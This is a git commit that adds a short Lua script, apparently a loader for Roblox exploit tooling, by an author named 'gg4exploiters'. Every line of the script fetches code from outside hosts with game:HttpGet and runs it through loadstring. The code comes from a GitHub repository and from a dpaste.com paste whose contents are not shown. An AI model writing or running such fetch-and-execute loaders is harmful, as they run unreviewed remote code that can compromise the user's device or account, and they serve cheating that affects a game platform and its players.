c73e3dd86428cae4e4a67945121e031782dd3d97
gg4exploiters <iloveexploiting123@gmail.com>
2024-09-24 07:05:17 +0800

    Create AlSolaraOLD.lua

---
+++ AlSolaraOLD.lua
@@ -0,0 +1,7 @@
+local debug = loadstring(game:HttpGet("https://raw.githubusercontent.com/zwar808/BetterUNC/refs/heads/main/lib/Debug.lua"))()
+local Drawing = loadstring(game:HttpGet("https://raw.githubusercontent.com/zwar808/BetterUNC/refs/heads/main/lib/Drawing.lua"))()
+local net = loadstring(game:HttpGet("https://raw.githubusercontent.com/zwar808/BetterUNC/refs/heads/main/lib/Net.lua"))()
+if debug then
+	loadstring(game:HttpGet("https://dpaste.com/3E3YZ2ZED.txt",true))()
+	print("[Debug] Operating: Alsploit_OLD")
+end
